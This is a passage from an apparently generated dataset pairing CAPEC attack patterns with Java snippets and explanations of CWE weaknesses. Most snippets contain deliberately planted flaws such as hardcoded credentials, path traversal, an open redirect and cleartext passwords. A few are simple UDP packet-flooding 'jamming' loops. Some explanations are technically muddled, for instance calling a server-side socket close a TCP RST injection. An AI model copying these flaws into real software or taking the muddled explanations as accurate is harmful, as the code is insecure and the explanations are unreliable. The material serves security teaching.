        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\n\npublic class SessionManager {\n    private Map<String, String> sessions = new HashMap<>();\n\n    public String login(String username, String password) {\n        // Improper Authentication (CWE-287)\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            String sessionId = UUID.randomUUID().toString();\n            sessions.put(sessionId, username);\n            return sessionId;\n        }\n        return null;\n    }\n\n    public boolean isAuthenticated(String sessionId) {\n        // Client-Side Enforcement of Server-Side Security (CWE-602)\n        return sessions.containsKey(sessionId);\n    }\n\n    public void logout(String sessionId) {\n        sessions.remove(sessionId);\n    }\n\n    public static void main(String[] args) {\n        SessionManager sm = new SessionManager();\n        String sessionId = sm.login(\"admin\", \"password\");\n        if (sessionId != null) {\n            System.out.println(\"Logged in with session ID: \" + sessionId);\n            // Simulate session hijacking by reusing the session ID\n            if (sm.isAuthenticated(sessionId)) {\n                System.out.println(\"Session is authenticated.\");\n            }\n            sm.logout(sessionId);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple session management system that is vulnerable to session hijacking. The `login` method performs improper authentication (CWE-287) by using hardcoded credentials. The `isAuthenticated` method relies on client-side enforcement of server-side security (CWE-602) by simply checking if the session ID exists in the session map. The `main` method simulates a session hijacking scenario by reusing the session ID after login. This code embodies the main idea of CAPEC-139 (Session Hijacking) by showing how an attacker can exploit weak session management to gain unauthorized access."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                handleClient(clientSocket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n             PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true)) {\n\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // CWE-319: Cleartext Transmission of Sensitive Information\n                System.out.println(\"Received: \" + inputLine);\n                // CWE-924: No integrity check on the received message\n                if (inputLine.equals(\"shutdown\")) {\n                    // CWE-99: Improper Control of Resource Identifiers\n                    System.out.println(\"Shutting down server as requested.\");\n                    System.exit(0);\n                }\n                // Echo the received message back to the client\n                out.println(inputLine);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for incoming connections on port 8080. The server accepts client connections and reads input from them. The code demonstrates several vulnerabilities: \n1. CWE-319: The server prints received messages to the console in cleartext, which could include sensitive information. \n2. CWE-924: The server does not perform any integrity checks on the received messages, making it susceptible to message tampering. \n3. CWE-99: The server improperly handles resource identifiers by allowing a 'shutdown' command from any client to terminate the server, without verifying the source of the command. \nThis setup embodies the main idea of the CAPEC 'Traffic Injection', where an adversary can inject traffic to disrupt or modify the connection, exploiting the lack of proper verification and control mechanisms."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                new Thread(new ClientHandler(clientSocket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            // Simulate handling client request\n            Thread.sleep(1000);\n            // Simulate connection reset attack\n            clientSocket.setSoLinger(true, 0); // Improper verification of source\n            clientSocket.close();\n        } catch (SocketException e) {\n            e.printStackTrace();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that is susceptible to a connection reset attack. The server listens on port 8080 and spawns a new thread to handle each client connection. In the ClientHandler class, the connection is abruptly closed using the setSoLinger method with a timeout of 0, simulating a connection reset attack. This demonstrates the CAPEC concept of an attacker injecting a connection reset packet to sever the connection. The code also embodies CWE-940 (Improper Verification of Source of a Communication Channel) as it does not verify the source of the connection reset request, making it vulnerable to such attacks."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class TCPRSTInjectionExample {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            InputStream input = clientSocket.getInputStream();\n            OutputStream output = clientSocket.getOutputStream();\n\n            // Read HTTP GET request (simplified)\n            byte[] buffer = new byte[1024];\n            int bytesRead = input.read(buffer);\n            String request = new String(buffer, 0, bytesRead);\n            System.out.println(\"Received request: \" + request);\n\n            // Simulate TCP RST Injection\n            if (request.contains(\"GET\")) {\n                System.out.println(\"Simulating TCP RST Injection\");\n                clientSocket.setSoLinger(true, 0); // Forcefully close the connection\n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of a TCP RST Injection attack. The server listens on port 8080 and accepts incoming connections. When a client sends an HTTP GET request, the server simulates a TCP RST Injection by forcefully closing the connection using the `setSoLinger` method with a timeout of 0. This causes the TCP connection to be terminated abruptly, mimicking the effect of a TCP RST packet. The code highlights the vulnerability described in CAPEC-460, where an adversary can disrupt a TCP connection by injecting RST packets. The related CWEs provide additional context on potential weaknesses, such as improper verification of communication sources and inconsistent interpretation of HTTP requests."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        String basePath = \"/var/www/uploads/\";\n\n        File file = new File(basePath + filename);\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability to Absolute Path Traversal attacks. The program takes a filename as a command-line argument and attempts to read and print the contents of the file located in the '/var/www/uploads/' directory. However, it does not properly validate or sanitize the user input, allowing an attacker to manipulate the 'filename' argument to include absolute paths or traversal sequences (e.g., '../../etc/passwd'). This can lead to unauthorized access to files outside the intended directory, embodying the main idea of the CAPEC and related CWEs."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DnsSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n            InetAddress addr = InetAddress.getByName(\"example.com\");\n            String hostname = addr.getHostName();\n            System.out.println(\"Resolved hostname: \" + hostname);\n\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            URL url = new URL(\"http://\" + hostname + \"/data\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // CWE-494: Download of Code Without Integrity Check\n            InputStream in = conn.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n\n            // CWE-601: URL Redirection to Untrusted Site\n            String redirectUrl = \"http://untrusted.com\";\n            System.out.println(\"Redirecting to: \" + redirectUrl);\n            URL redirect = new URL(redirectUrl);\n            HttpURLConnection redirectConn = (HttpURLConnection) redirect.openConnection();\n            redirectConn.setRequestMethod(\"GET\");\n            redirectConn.getInputStream();\n\n            // CWE-918: Server-Side Request Forgery (SSRF)\n            URL ssrfUrl = new URL(\"http://internal-service/data\");\n            HttpURLConnection ssrfConn = (HttpURLConnection) ssrfUrl.openConnection();\n            ssrfConn.setRequestMethod(\"GET\");\n            ssrfConn.getInputStream();\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of DNS Spoofing and related vulnerabilities. The code performs the following actions:\n\n1. **CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action** - The code resolves the hostname for 'example.com' and uses it for further actions without verifying the association between the IP address and the hostname.\n\n2. **CWE-941: Incorrectly Specified Destination in a Communication Channel** - The code constructs a URL using the resolved hostname, which could be incorrect if DNS spoofing occurs.\n\n3. **CWE-494: Download of Code Without Integrity Check** - The code downloads data from the constructed URL without verifying its integrity.\n\n4. **CWE-601: URL Redirection to Untrusted Site** - The code redirects to an untrusted URL, which could facilitate phishing attacks.\n\n5. **CWE-918: Server-Side Request Forgery (SSRF)** - The code makes a request to an internal service URL, which could be exploited if the URL is manipulated.\n\nThis snippet highlights how DNS spoofing can lead to various security issues by exploiting weaknesses in DNS resolution, URL construction, and lack of integrity checks."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.Socket;\nimport java.io.OutputStream;\nimport java.io.InputStream;\n\npublic class TerrestrialJammingExample {\n    public static void main(String[] args) {\n        String serverAddress = \"192.168.1.100\";\n        int port = 8080;\n        String sensitiveData = \"Sensitive Information\";\n\n        try (Socket socket = new Socket(serverAddress, port)) {\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(sensitiveData.getBytes());\n            outputStream.flush();\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission\n            InputStream inputStream = socket.getInputStream();\n            byte[] response = new byte[1024];\n            int bytesRead = inputStream.read(response);\n            String responseData = new String(response, 0, bytesRead);\n            System.out.println(\"Received: \" + responseData);\n\n            // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            if (!serverAddress.equals(socket.getInetAddress().getHostAddress())) {\n                System.out.println(\"Warning: Communicating with an unintended endpoint!\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a simple client-server communication scenario that embodies the main idea of the CAPEC 'Terrestrial Jamming' attack pattern. The code establishes a socket connection to a server and transmits sensitive information in cleartext (CWE-319). It also reads a response from the server without ensuring message integrity (CWE-924). Additionally, it checks if the communication is with the intended endpoint but does not enforce it properly (CWE-923). This setup is vulnerable to terrestrial jamming attacks, where an adversary could disrupt or intercept the communication, leading to potential data breaches or unauthorized access."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class CredentialStuffingExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n    private static Map<String, Integer> loginAttempts = new HashMap<>();\n    private static final int MAX_ATTEMPTS = 5;\n\n    public static void main(String[] args) {\n        // Sample user credentials\n        userDatabase.put(\"user1\", \"password123\");\n        userDatabase.put(\"user2\", \"password456\");\n\n        // Simulate login attempts\n        System.out.println(login(\"user1\", \"password123\")); // Successful login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Failed login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Failed login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Failed login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Failed login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Account locked\n    }\n\n    public static String login(String username, String password) {\n        if (!userDatabase.containsKey(username)) {\n            return \"User not found\";\n        }\n\n        if (loginAttempts.getOrDefault(username, 0) >= MAX_ATTEMPTS) {\n            return \"Account locked due to too many failed attempts\";\n        }\n\n        if (userDatabase.get(username).equals(password)) {\n            loginAttempts.put(username, 0); // Reset attempts on successful login\n            return \"Login successful\";\n        } else {\n            loginAttempts.put(username, loginAttempts.getOrDefault(username, 0) + 1);\n            return \"Invalid credentials\";\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple authentication system that is vulnerable to credential stuffing attacks. The `login` method checks if the provided username and password match the stored credentials. If the credentials are incorrect, it increments the login attempt count. If the number of failed attempts exceeds a maximum threshold, the account is locked. This example highlights several weaknesses: reliance on single-factor authentication (CWE-308), improper restriction of excessive authentication attempts (CWE-307), and insufficiently protected credentials (CWE-522). The code does not implement multi-factor authentication or password aging, making it susceptible to credential stuffing attacks as described in the CAPEC."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class JammingExample {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"192.168.1.1\");\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 8080);\n\n        // Simulate jamming by sending a large number of packets\n        for (int i = 0; i < 10000; i++) {\n            socket.send(packet);\n        }\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a jamming attack, where a large number of UDP packets are sent to a specific IP address and port, overwhelming the target's network resources. This embodies the main idea of the CAPEC 'Jamming' by intentionally overwhelming system resources with illegitimate traffic, thereby denying service to legitimate users. The code also touches on CWE-406 (Insufficient Control of Network Message Volume) as it does not monitor or control the volume of transmitted network traffic, allowing an actor to flood the network. Additionally, it indirectly relates to CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) as the code does not verify if the communication is with the correct endpoint."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // Use of obsolete function (CWE-477)\n            Class.forName(\"com.mysql.jdbc.Driver\");\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test\", \"user\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(\"SELECT * FROM users\");\n\n            while (rs.next()) {\n                System.out.println(rs.getString(\"username\"));\n            }\n\n            // Deprecated method for closing connection\n            conn.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the use of deprecated and obsolete functions, which is a common issue in legacy codebases. The code uses the deprecated `Class.forName(\"com.mysql.jdbc.Driver\")` method to load the MySQL JDBC driver, which has been replaced by `com.mysql.cj.jdbc.Driver` in newer versions. This suggests that the code has not been actively reviewed or maintained, aligning with CWE-477 (Use of Obsolete Function). Additionally, the code does not implement any modern security practices for handling database connections, making it vulnerable to various attacks such as SQL injection and unauthorized data access. This embodies the main idea of the CAPEC, which focuses on the degradation of security due to the use of outdated and deprecated methods."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "import java.util.ArrayList;\nimport java.util.List;\n\npublic class ResourceBlockage {\n    private static List<Object> resourceList = new ArrayList<>();\n\n    public static void main(String[] args) {\n        while (true) {\n            // Allocate resources without limits\n            resourceList.add(new Object());\n            // Simulate resource consumption\n            if (resourceList.size() % 1000 == 0) {\n                System.out.println(\"Allocated resources: \" + resourceList.size());\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a resource blockage scenario by continuously allocating memory without any limits or throttling. The 'resourceList' keeps growing indefinitely, simulating uncontrolled resource consumption (CWE-400) and allocation of resources without limits (CWE-770). This can lead to the exhaustion of system memory, causing the system to fail or stop working, embodying the main idea of the CAPEC 'Blockage'. The code also indirectly shows a protection mechanism failure (CWE-693) as it does not implement any checks or limits to prevent resource exhaustion."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class WiFiJamming {\n    public static void main(String[] args) throws IOException {\n        // IP address of the target Wi-Fi network\n        String targetIP = \"192.168.1.1\";\n        int port = 12345; // Common port for Wi-Fi management frames\n        byte[] deauthFrame = new byte[1024]; // Simulated deauthentication frame\n\n        // Fill the deauthFrame with some data (this is just a simulation)\n        for (int i = 0; i < deauthFrame.length; i++) {\n            deauthFrame[i] = (byte) 0xFF;\n        }\n\n        InetAddress targetAddress = InetAddress.getByName(targetIP);\n        DatagramPacket packet = new DatagramPacket(deauthFrame, deauthFrame.length, targetAddress, port);\n        DatagramSocket socket = new DatagramSocket();\n\n        // Continuously send deauthentication frames to jam the Wi-Fi network\n        while (true) {\n            socket.send(packet);\n            System.out.println(\"Deauthentication frame sent to \" + targetIP);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic form of Wi-Fi jamming by continuously sending deauthentication frames to a target Wi-Fi network. The code uses a DatagramSocket to send UDP packets filled with simulated deauthentication frame data to the target IP address and port. This action can disrupt the communication of the targeted Wi-Fi network, preventing users from transmitting or receiving data. The code embodies the main idea of the CAPEC by actively transmitting on the Wi-Fi channel to interfere with network operations. The related CWEs provide context on potential weaknesses, such as improper enforcement of message integrity (CWE-924), improper restriction of communication channels (CWE-923), and cleartext transmission of sensitive information (CWE-319), which can be exploited in such attacks."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class CellularJammingExample {\n    public static void main(String[] args) throws IOException {\n        // IP address of the cell tower\n        InetAddress cellTowerAddress = InetAddress.getByName(\"192.168.1.1\");\n        int port = 12345;\n        byte[] buffer = new byte[1024];\n\n        // Create a DatagramSocket to send false status messages\n        DatagramSocket socket = new DatagramSocket();\n\n        // Craft a false status message\n        String falseStatusMessage = \"STATUS:OVERLOAD\";\n        buffer = falseStatusMessage.getBytes();\n\n        // Send the false status message to the cell tower\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, cellTowerAddress, port);\n        socket.send(packet);\n\n        // Introduce high levels of noise on signaling channels\n        for (int i = 0; i < 1000; i++) {\n            String noiseMessage = \"NOISE\" + i;\n            buffer = noiseMessage.getBytes();\n            packet = new DatagramPacket(buffer, buffer.length, cellTowerAddress, port);\n            socket.send(packet);\n        }\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a cellular jamming attack. The code sends false status messages and high levels of noise to a cell tower, disrupting communication between cellular user devices and the cell tower. The code does not verify the integrity or source of the messages, embodying CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) and CWE-940 (Improper Verification of Source of a Communication Channel). Additionally, the code does not protect against physical side channels (CWE-1300) and transmits data in cleartext (CWE-319), making it vulnerable to sniffing and unauthorized access (CWE-300)."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\n\npublic class CellularEncryption {\n    public static void main(String[] args) throws Exception {\n        // Simulate negotiation of encryption algorithm\n        String[] algorithms = {\"AES\", \"DES\", \"Blowfish\"};\n        String selectedAlgorithm = negotiateAlgorithm(algorithms);\n\n        // Generate key\n        SecretKey key = generateKey(selectedAlgorithm);\n\n        // Initialize cipher with selected algorithm\n        Cipher cipher = Cipher.getInstance(selectedAlgorithm);\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n\n        // Encrypt data\n        String data = \"Sensitive Data\";\n        byte[] encryptedData = cipher.doFinal(data.getBytes());\n\n        System.out.println(\"Encrypted Data: \" + new String(encryptedData));\n    }\n\n    private static String negotiateAlgorithm(String[] algorithms) {\n        // Simulate a downgrade attack by selecting a weaker algorithm\n        for (String algorithm : algorithms) {\n            if (algorithm.equals(\"DES\")) {\n                return algorithm; // Select a weaker algorithm\n            }\n        }\n        return algorithms[0]; // Default to the first algorithm\n    }\n\n    private static SecretKey generateKey(String algorithm) throws NoSuchAlgorithmException {\n        KeyGenerator keyGen = KeyGenerator.getInstance(algorithm);\n        SecureRandom random = new SecureRandom();\n        keyGen.init(random);\n        return keyGen.generateKey();\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a cellular device negotiates an encryption algorithm for securing data transmission. The `negotiateAlgorithm` method simulates an algorithm downgrade attack by selecting a weaker algorithm (DES) instead of stronger options (AES, Blowfish). The `generateKey` method generates a cryptographic key for the selected algorithm. The `Cipher` class is then used to encrypt sensitive data using the selected (weaker) algorithm. This code embodies the main idea of CAPEC-Weakening of Cellular Encryption by illustrating how an attacker can force the use of a less secure encryption algorithm, making the communication vulnerable to attacks. The related CWEs are represented by the selection of a less secure algorithm (CWE-757), the use of a weak encryption algorithm (CWE-326), and the potential for using a broken or risky cryptographic algorithm (CWE-327)."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "import java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class ObstructionExample {\n    private Lock lock = new ReentrantLock();\n    private boolean isProtected = false;\n\n    public void enableProtection() {\n        lock.lock();\n        try {\n            isProtected = true;\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public void disableProtection() {\n        lock.lock();\n        try {\n            isProtected = false;\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public void performCriticalOperation() {\n        if (!isProtected) {\n            System.out.println(\"Protection mechanism is disabled. Critical operation is vulnerable.\");\n            // Simulate a critical operation that can be obstructed\n        } else {\n            System.out.println(\"Protection mechanism is enabled. Performing critical operation.\");\n            // Perform the critical operation safely\n        }\n    }\n\n    public static void main(String[] args) {\n        ObstructionExample example = new ObstructionExample();\n        example.disableProtection(); // Simulate an attacker disabling protection\n        example.performCriticalOperation(); // Critical operation is now vulnerable\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can obstruct the interactions between system components by disabling a protection mechanism. The `ObstructionExample` class has methods to enable and disable a protection mechanism using a lock to simulate proper isolation and compartmentalization. The `performCriticalOperation` method checks if the protection mechanism is enabled before performing a critical operation. In the `main` method, the protection is disabled, simulating an attack that makes the critical operation vulnerable. This example embodies the CAPEC concept of obstruction and incorporates related CWEs such as Protection Mechanism Failure (CWE-693) and Improper Isolation or Compartmentalization (CWE-653)."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class CellularEncryption {\n    // CWE-321: Use of Hard-coded Cryptographic Key\n    private static final String HARD_CODED_KEY = \"1234567890123456\"; // 16-byte key for AES\n\n    public static void main(String[] args) throws Exception {\n        String plaintext = \"Sensitive data\";\n\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm (DES)\n        Cipher cipher = Cipher.getInstance(\"DES\");\n        SecretKeySpec keySpec = new SecretKeySpec(HARD_CODED_KEY.getBytes(), \"DES\");\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n        byte[] encrypted = cipher.doFinal(plaintext.getBytes());\n        String encryptedText = Base64.getEncoder().encodeToString(encrypted);\n        System.out.println(\"Encrypted Text: \" + encryptedText);\n\n        // CWE-757: Algorithm Downgrade\n        // Simulating a downgrade to a weaker algorithm (DES instead of AES)\n        cipher = Cipher.getInstance(\"DES\");\n        cipher.init(Cipher.DECRYPT_MODE, keySpec);\n        byte[] decrypted = cipher.doFinal(Base64.getDecoder().decode(encryptedText));\n        String decryptedText = new String(decrypted);\n        System.out.println(\"Decrypted Text: \" + decryptedText);\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerabilities described in the CAPEC and related CWEs. The code uses a hard-coded cryptographic key (CWE-321) and a broken or risky cryptographic algorithm (DES, CWE-327) to encrypt and decrypt sensitive data. Additionally, it simulates an algorithm downgrade (CWE-757) by using DES instead of a stronger algorithm like AES. This represents the main idea of the CAPEC, which involves the use of weak cellular encryption algorithms that can be exploited by attackers to decrypt sensitive information."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "import java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            String sensitiveData = \"username=admin&password=admin123\";\n            URL url = new URL(\"http://example.com/login\"); // CWE-311: Missing Encryption of Sensitive Data\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            OutputStream os = conn.getOutputStream();\n            os.write(sensitiveData.getBytes()); // CWE-319: Cleartext Transmission of Sensitive Information\n            os.flush();\n            os.close();\n\n            int responseCode = conn.getResponseCode();\n            System.out.println(\"Response Code: \" + responseCode);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication scenario where sensitive data (username and password) is transmitted in cleartext over an HTTP connection. This embodies the main idea of the CAPEC 'Cellular Traffic Intercept' by showing how sensitive information can be intercepted due to lack of encryption (CWE-311) and cleartext transmission (CWE-319). The code does not verify the source of the communication channel (CWE-940) and does not ensure message integrity (CWE-924), making it susceptible to interception and tampering by malicious actors."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class CellularDataInjection {\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword=12345\"; // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String cleartextMessage = \"GET / HTTP/1.1\\nHost: example.com\\n\\n\" + sensitiveData; // CWE-319: Cleartext Transmission of Sensitive Information\n\n        try (Socket socket = new Socket(\"example.com\", 80)) {\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(cleartextMessage.getBytes());\n            outputStream.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a basic example of cellular data injection by sending a cleartext HTTP request containing sensitive information. The code connects to a server (example.com) on port 80 and sends an HTTP GET request with sensitive data (a user password) appended to the request. This embodies the main idea of the CAPEC by showing how an adversary could inject data into mobile technology traffic to disrupt communications or conduct surveillance. The code also highlights several related CWEs: CWE-201 (insertion of sensitive information into sent data), CWE-319 (cleartext transmission of sensitive information), and CWE-924 (improper enforcement of message integrity during transmission)."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableRedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"url\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            response.sendRedirect(targetUrl);\n        } else {\n            response.sendRedirect(\"https://trusted-domain.com\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to BitSquatting and CWE-601 (URL Redirection to Untrusted Site). The servlet takes a 'url' parameter from the HTTP GET request and redirects the user to that URL without any validation. This can be exploited by an attacker who registers a domain name that is one bit different from a trusted domain (BitSquatting). Users could be redirected to a malicious site if they mistype the URL or if there are random memory errors. This code snippet embodies the main idea of BitSquatting by showing how an unvalidated redirect can be used to direct traffic to an adversary-controlled domain."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class WiFiMACAddressTracker {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(9999);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String receivedData = new String(packet.getData(), 0, packet.getLength());\n            String macAddress = extractMACAddress(receivedData);\n            if (macAddress != null) {\n                System.out.println(\"Tracked MAC Address: \" + macAddress);\n            }\n        }\n    }\n\n    private static String extractMACAddress(String data) {\n        // Simplified extraction logic for demonstration purposes\n        if (data.contains(\"MAC:\")) {\n            return data.substring(data.indexOf(\"MAC:\") + 4, data.indexOf(\"MAC:\") + 21);\n        }\n        return null;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a WiFi MAC address tracker. The program listens for incoming UDP packets on port 9999, extracts the MAC address from the received data, and prints it to the console. This embodies the main idea of the CAPEC 'WiFi MAC Address Tracking' by passively listening for WiFi messages and logging the associated MAC addresses. The code also touches on related CWEs: it transmits sensitive information (CWE-201), does not verify the identity of actors (CWE-300), and opens a communication channel that could be accessed by unauthorized actors (CWE-421)."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
